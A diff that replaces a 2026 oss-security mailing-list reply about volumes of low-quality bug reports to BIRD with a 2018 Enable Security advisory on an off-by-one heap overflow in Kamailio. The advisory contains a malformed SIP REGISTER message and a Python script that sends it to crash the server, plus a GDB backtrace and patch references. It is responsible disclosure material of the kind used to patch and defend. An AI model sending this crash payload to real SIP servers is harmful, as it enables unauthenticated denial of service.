@@ -1,4 +1,9 @@
-Received: (qmail 1653 invoked by uid 550); 2 Jun 2026 20:41:42 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["7104" "Tuesday" "20" "March" "2018" "05:52:54" "+0100" "Sandro Gauci" "sandro@enablesecurity.com" "<1521521574.957082.1309156808.3BAB1338@webmail.messagingengine.com>" "135" "[oss-security] ES2018-05 Kamailio heap overflow" nil nil nil "3" "2018032004:52:54" "[oss-security] ES2018-05 Kamailio heap overflow" (number mark "U       sandro@enabl Mar 20  135/7104  " thread-indent "\"[oss-security] ES2018-05 Kamailio heap overflow\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 3117 invoked by uid 550); 20 Mar 2018 11:29:35 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,57 +12,170 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 1624 invoked from network); 2 Jun 2026 20:41:42 -0000
-DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=spacehopper.org;
-	s=s3e; t=1780432893; h=from:from:subject:subject:date:date:message-id:message-id:
-	 in-reply-to:in-reply-to:references:references;
-	bh=adKZAd0WHlRUaMpkOBmXGqdwvf10/y+AyB7tH3bS1Mo=;
-	b=FKpiRFxP9btP7sAg+JRTJzba3dmH0rQvFyat1ZakGx5oBq3G2ve+EHioVGnFNm+65Uot7t
-	4rfhBobThGAt5vDg==
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=spacehopper.org;
-	s=s3; t=1780432893; h=from:from:subject:subject:date:date:message-id:message-id:
-	 in-reply-to:in-reply-to:references:references;
-	bh=adKZAd0WHlRUaMpkOBmXGqdwvf10/y+AyB7tH3bS1Mo=;
-	b=Ppwosbh2qGjc7xhkF7Aw3aoPcKRB65JXT9+sVMH9y6AQhlAnNEJDCLT9VQWJbMPJH5qYW+
-	cQjH2w+r4+CCHdunhuK+ytZmFrXrhoF8KgfzSPjqWK1HxwbEoEUz78rlUqDZk+aHjSpWfl
-	vLaEv9NEMrsHJlo9wU9t70xSDtoyl2BZag6Kjm/HWDzBZyoWiA2POPPZwIJ7i04S6eH7ly
-	74k3dfOkaxPEUDUnrg2daZNoq0I4W6YiU8x9ZkWwyPICc1mCOoslhH/mI59jWHrk29B9M4
-	SAV8vF5ws+w4sIuoQdcBZwM/W1U8dvzdU+8VcdSGpkeqpNz/chWDzDMDy1Pb2A==
-Date: Tue, 2 Jun 2026 21:41:33 +0100
-From: Stuart Henderson <stu@spacehopper.org>
-To: oss-security@lists.openwall.com
-Message-ID: <ah8__bTk_qGYMjrQ@symphytum.spacehopper.org>
-References: <CA+W5nyiFPweL5LDEKpUSJAo8NhKQz53o=d=9HBdHipQ7d0N3Mw@mail.gmail.com>
- <ah62-ZU9c_cEa8f0@symphytum.spacehopper.org>
- <C9D46D56-8664-45BF-991A-D5226C84B79C@lightwave.net.ru>
- <ah8ScoDc8O4mG-_H@symphytum.spacehopper.org>
- <41F35F72-E66D-49B8-BE03-CBBE71275CD0@lightwave.net.ru>
+Received: (qmail 32623 invoked from network); 20 Mar 2018 04:53:06 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+	enablesecurity.com; h=content-transfer-encoding:content-type
+	:date:from:message-id:mime-version:subject:to:x-me-sender
+	:x-me-sender:x-sasl-enc; s=mesmtp; bh=wTrI4rcM2G/wqzm64WE0Ly8Mld
+	G0RM2oRNBmwHBoZ3w=; b=WVNw23zj+UCHgr45ExUzu4Frq447fiC4SMELP5HmNc
+	ofok0VkD2F0vEIGitr47gUomtAPyHi5mPccK04ieI0YeVD08s/TuJxtKUC8ahlQT
+	piFdZ8nDrUgEr1lDKxRFffRCLK/f6ZK/Vf9WgAQPLnTTv+gMfi7RqyB1HmIyp+BO
+	w=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=
+	messagingengine.com; h=content-transfer-encoding:content-type
+	:date:from:message-id:mime-version:subject:to:x-me-sender
+	:x-me-sender:x-sasl-enc; s=fm2; bh=wTrI4rcM2G/wqzm64WE0Ly8MldG0R
+	M2oRNBmwHBoZ3w=; b=ZwyAiStmBwhmETY6c27ZFKcNKUMx0Q4qru/JWFHi6yXtK
+	iAPAPInAAJvT/83qN4p14Hu+6CMBV2ZnR0afhb/UObRiwCALEmXR8ifT0d1xb0hY
+	P7ZiXMmRNhMKJOGn8VsVIgW6NM9WZWOhwKNzHSE4tfEPYNJlnI8ILfwNbXE6L9X1
+	jWNGEqpoPbWfuV8i3ZXyed6Vpgi2ZJnxiEpzWkSOSo9quRKfANQP+T1844g1Tk7a
+	5n3LB/5ij3rIyVGwyaeVdRiZHKUBOlxZcUeJAKy4vBfOUcLmXaZLRsh64pKz1B/L
+	XpFXRt0wTyBI3GW76nIFyvnfZ56wEHN2OxmnSKBtg==
+X-ME-Sender: <xms:ppOwWgCL4ya1EVa7Uiifn0Jd8U1z7wXU-GfLD7t933A8Gb1l6Io71Q>
+Message-Id: <1521521574.957082.1309156808.3BAB1338@webmail.messagingengine.com>
+From: Sandro Gauci <sandro@enablesecurity.com>
+To: oss-security@lists.openwall.com, bugtraq@securityfocus.com,
+ fulldisclosure@seclists.org, voipsec@voipsa.org,
+ submissions@packetstormsecurity.org, vuln@secunia.com, cert@cert.org
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <41F35F72-E66D-49B8-BE03-CBBE71275CD0@lightwave.net.ru>
-Subject: Re: [oss-security] BIRD/BIRD2: stack buffer overflow in BGP AS_PATH
- mask matching, CVE pending
+Content-Transfer-Encoding: 7bit
+Content-Type: text/plain; charset="utf-8"
+X-Mailer: MessagingEngine.com Webmail Interface - ajax-5ce6c4ba
+Date: Tue, 20 Mar 2018 05:52:54 +0100
+Subject: [oss-security] ES2018-05 Kamailio heap overflow
 
-On 2026/06/02 21:14, Dan Yefihmov wrote:
-> On June 2, 2026 8:27:14 PM GMT+03:00, Stuart Henderson <stu@spacehopper.org> wrote:
-> >Yes, I did. That doesn't rule out things like "don't plan to fix because
-> >it's no longer an issue".
-> >
-> Didn't you think that in that case it's considerably more reasonable to explicitly write: "It's already fixed, and the fix will be in the next release scheduled at ..." instead of "We don't CURRENTLY plan to fix it"?
+# Off-by-one heap overflow in Kamailio
 
-I'm not sure if you're aware of the sheer number of reports that
-widely-used projects are receiving recently.
+- Authors:
+    - Alfred Farrugia <alfred@enablesecurity.com>
+    - Sandro Gauci <sandro@enablesecurity.com>
+- Fixed versions: Kamailio v5.1.2, v5.0.6 and v4.4.7
+- References: no CVE assigned yet
+- Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2018-05-kamailio-heap-overflow>
+- Tested vulnerable versions: 5.1.1, 5.1.0, 5.0.0
+- Timeline:
+    - Report date: 2018-02-10
+    - Kamailio confirmed issue: 2018-02-10
+    - Kamailio patch: 2018-02-10
+    - Kamailio release with patch: 2018-03-01
+    - Enable Security advisory: 2018-03-19
 
-From the talk I linked to, for BIRD from the start of 2026 up to 19 May,
-that was *70*. The ones I've seen (not for BIRD) they're often extremely
-verbose, and they're often plain wrong (the talk suggests ~ 9% of the
-reports for BIRD were valid).
+## Description
 
-At this point I think it is fairly reasonable for small development
-teams to not spend all that much time researching a lower-effort
-report. If it's valid there will likely be a handful of duplicate
-reports coming along soon afterwards anyway, and hopefully one of
-those may have done more triage before sending out.
+A specially crafted REGISTER message with a malformed `branch` or `From tag` triggers an off-by-one heap overflow.
 
+## Impact
+
+Abuse of this vulnerability leads to denial of service in Kamailio. Further research may show that exploitation leads to remote code execution.
+
+## How to reproduce the issue
+
+The following SIP message was used to reproduce the issue with a `From` header containing the `tag` that triggers the vulnerability:
+
+
+```
+REGISTER sip:localhost:5060 SIP/2.0
+Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394
+To: <sip:1@localhost:5060>
+From: Test <sip:2@localhost:5060>;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg
+Call-ID: 8b113457-c6a6-456a-be68-606686d93c38
+Contact: sip:1@127.0.0.1:53497
+Max-Forwards: 70
+CSeq: 10086 REGISTER
+User-Agent: go SIP fuzzer/1
+Content-Length: 0
+
+```
+
+We used this python script to reproduce the crash:
+
+```
+#!/usr/bin/env python
+import socket
+import sys
+
+PROTO = "udp"
+SERVER_IP = "127.0.0.1"
+SERVER_PORT = 5060
+
+for _ in range(2):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.connect((sys.argv[1], int(sys.argv[2])))
+
+    msg = "REGISTER sip:localhost:5060 SIP/2.0\r\n" \
+        "Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394\r\n" \
+        "To: <sip:1@localhost:5060>\r\n" \
+        "From: Test <sip:2@localhost:5060>;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg\r\n" \
+        "Call-ID: 8b113457-c6a6-456a-be68-606686d93c38\r\n" \
+        "Contact: sip:1@127.0.0.1:53497\r\n" \
+        "Max-Forwards: 70\r\n" \
+        "CSeq: 10086 REGISTER\r\n" \
+        "User-Agent: go SIP fuzzer/1\r\n" \
+        "Content-Length: 0\r\n" \
+        "\r\n"
+
+    sock.sendall(msg)
+```
+
+
+Run using:
+
+```
+python crash.py <ip> <port>
+```
+
+The expected result is a crash in Kamailio.
+
+Notes: 
+
+- authentication is not required
+- SIP extension does not need to exist
+- Message can be sent over TCP or UDP
+
+### GDB backtrace result
+
+Both crashes produce a similar backtrace in GDB:
+
+```
+#0  0x00007f08c3f16428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
+#1  0x00007f08c3f1802a in __GI_abort () at abort.c:89
+#2  0x0000000000669a6e in qm_debug_frag (qm=0x7f08ba615000, f=0x7f08ba8c70a8, file=0x7f08c0bba514 "tmx: tmx_pretran.c", line=250) at core/mem/q_malloc.c:147
+#3  0x000000000066b49e in qm_malloc (qmp=0x7f08ba615000, size=136, file=0x7f08c0bba514 "tmx: tmx_pretran.c", func=0x7f08c0bbb320 <__func__.7497> "tmx_check_pretran", line=250, mname=0x7f08c0bba510 "tmx") at core/mem/q_malloc.c:380
+#4  0x00000000006758e8 in qm_shm_malloc (qmp=0x7f08ba615000, size=136, file=0x7f08c0bba514 "tmx: tmx_pretran.c", func=0x7f08c0bbb320 <__func__.7497> "tmx_check_pretran", line=250, mname=0x7f08c0bba510 "tmx") at core/mem/q_malloc.c:1206
+#5  0x00007f08c0baf879 in tmx_check_pretran (msg=0x7f08c37a3250) at tmx_pretran.c:250
+#6  0x00007f08c0bac901 in t_precheck_trans (msg=0x7f08c37a3250) at tmx_mod.c:858
+#7  0x00007f08c0bac939 in w_t_precheck_trans (msg=0x7f08c37a3250, p1=0x0, p2=0x0) at tmx_mod.c:869
+#8  0x000000000047b0e4 in do_action (h=0x7fff808ef7e0, a=0x7f08c374e6c0, msg=0x7f08c37a3250) at core/action.c:1067
+#9  0x0000000000487df1 in run_actions (h=0x7fff808ef7e0, a=0x7f08c374e6c0, msg=0x7f08c37a3250) at core/action.c:1565
+#10 0x00000000004884a7 in run_actions_safe (h=0x7fff808f0860, a=0x7f08c374e6c0, msg=0x7f08c37a3250) at core/action.c:1633
+#11 0x0000000000446725 in rval_get_int (h=0x7fff808f0860, msg=0x7f08c37a3250, i=0x7fff808efb44, rv=0x7f08c374e818, cache=0x0) at core/rvalue.c:912
+#12 0x000000000044ae11 in rval_expr_eval_int (h=0x7fff808f0860, msg=0x7f08c37a3250, res=0x7fff808efb44, rve=0x7f08c374e810) at core/rvalue.c:1910
+#13 0x000000000047aba7 in do_action (h=0x7fff808f0860, a=0x7f08c374f3b0, msg=0x7f08c37a3250) at core/action.c:1043
+#14 0x0000000000487df1 in run_actions (h=0x7fff808f0860, a=0x7f08c374f3b0, msg=0x7f08c37a3250) at core/action.c:1565
+#15 0x000000000047b050 in do_action (h=0x7fff808f0860, a=0x7f08c374f650, msg=0x7f08c37a3250) at core/action.c:1058
+#16 0x0000000000487df1 in run_actions (h=0x7fff808f0860, a=0x7f08c374b610, msg=0x7f08c37a3250) at core/action.c:1565
+#17 0x00000000004885b3 in run_top_route (a=0x7f08c374b610, msg=0x7f08c37a3250, c=0x0) at core/action.c:1654
+#18 0x000000000059c7dc in receive_msg (
+    buf=0xa48120 <buf> "REGISTER sip:127.0.0.1:5060 SIP/2.0\r\nVia: SIP/2.0/TCP 127.0.0.1:51315;branch=z340282366920938463463374607431768211455hG4bKecc-65715664045141690323692c170141183460469231731687303715884105859-4b6d-48dc-"..., len=608,
+    rcv_info=0x7fff808f0c20) at core/receive.c:277
+#19 0x00000000004a7b7c in udp_rcv_loop () at core/udp_server.c:554
+#20 0x00000000004232d0 in main_loop () at main.c:1626
+#21 0x000000000042a97a in main (argc=7, argv=0x7fff808f12d8) at main.c:2646
+(gdb)
+```
+
+This security issue was discovered through the use of simple fuzzing with [Radamsa](https://github.com/aoh/radamsa) and our internal toolset.
+
+## Solutions and recommendations
+
+Apply the patch at <https://github.com/kamailio/kamailio/commit/e1d8008a09d9390ebaf698abe8909e10dfec4097> or make use of a release that includes that patch (e.g. v5.1.2, v5.0.6 or v4.4.7).
+
+Enable Security would like to thank Daniel-Constantin Mierla of the Kamailio Project for the very quick response and fix within hours of our report.
+
+## About Enable Security
+
+[Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.
+
+## Disclaimer
+
+The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
